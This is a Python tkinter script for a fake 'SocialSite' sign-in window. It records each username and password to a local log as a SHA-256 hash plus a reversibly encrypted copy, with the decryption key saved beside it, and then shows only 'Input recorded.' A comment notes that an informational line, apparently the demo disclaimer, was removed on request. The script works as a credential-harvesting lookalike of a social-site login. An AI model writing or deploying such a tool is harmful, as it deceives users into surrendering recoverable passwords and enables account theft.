#!/usr/bin/env python3
"""
Minimal safe demo login GUI (info line removed).

- Dark-themed login window with only Username, Password and Log In.
- Stores timestamp, username, password_sha256, and password_enc (Fernet token)
  in logs/credentials.log.
- key.key is created next to the script (keep it private).
"""

import os
import hashlib
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox

from cryptography.fernet import Fernet

BASE_DIR = os.path.dirname(__file__)
LOGS_DIR = os.path.join(BASE_DIR, "logs")
LOG_FILE = os.path.join(LOGS_DIR, "credentials.log")
KEY_FILE = os.path.join(BASE_DIR, "key.key")

os.makedirs(LOGS_DIR, exist_ok=True)

# ---------- crypto utilities ----------
def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()

def load_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as kf:
            key = kf.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as kf:
            kf.write(key)
        try:
            os.chmod(KEY_FILE, 0o600)
        except Exception:
            pass
    return key

FERNET_KEY = load_or_create_key()
FERNET = Fernet(FERNET_KEY)

def encrypt_password(password: str) -> str:
    token = FERNET.encrypt(password.encode("utf-8"))
    return token.decode("utf-8")

def append_log(username: str, password_hash: str, password_enc_token: str):
    ts = datetime.utcnow().isoformat(timespec='seconds') + "Z"
    entry = f"{ts}\tusername:{username}\tpassword_sha256:{password_hash}\tpassword_enc:{password_enc_token}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry)

# ---------- GUI ----------
class SimpleLoginApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("SocialSite — Secure Login (Demo)")
        self.configure(bg="#0b0c0d")
        self.geometry("420x220")
        self.resizable(False, False)

        frame = ttk.Frame(self, padding=16, style="Card.TFrame")
        frame.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(frame, text="Sign in to SocialSite", font=("Segoe UI", 14, "bold"),
                 fg="#F9FAFB", bg="#0b0c0d").pack(anchor="w", pady=(0,10))

        self.username_var = tk.StringVar()
        tk.Label(frame, text="Username or email", fg="#D1D5DB", bg="#0b0c0d").pack(anchor="w")
        username_entry = ttk.Entry(frame, textvariable=self.username_var, width=36)
        username_entry.pack(anchor="w", pady=(0,8))
        username_entry.focus_set()

        self.password_var = tk.StringVar()
        tk.Label(frame, text="Password", fg="#D1D5DB", bg="#0b0c0d").pack(anchor="w")
        password_entry = ttk.Entry(frame, textvariable=self.password_var, width=36, show="•")
        password_entry.pack(anchor="w", pady=(0,12))

        login_btn = ttk.Button(frame, text="Log In", command=self.on_login)
        login_btn.pack(anchor="w")

        # Info line removed per request

        self.setup_styles()
        self.bind("<Return>", lambda e: self.on_login())

    def setup_styles(self):
        style = ttk.Style(self)
        style.configure("TFrame", background="#0b0c0d")
        style.configure("Card.TFrame", background="#111827")
        style.configure("TLabel", background="#0b0c0d", foreground="#E5E7EB")
        style.configure("TEntry", foreground="#0b0c0d")
        style.configure("TButton", padding=6)

    def on_login(self):
        username = self.username_var.get().strip()
        password = self.password_var.get()
        if not username or not password:
            messagebox.showwarning("Missing data", "Please enter both username and password.")
            return

        pw_hash = hash_password(password)
        pw_enc = encrypt_password(password)
        append_log(username, pw_hash, pw_enc)

        self.password_var.set("")
        messagebox.showinfo("Recorded (Demo)", "Input recorded.")

if __name__ == "__main__":
    app = SimpleLoginApp()
    app.mainloop()
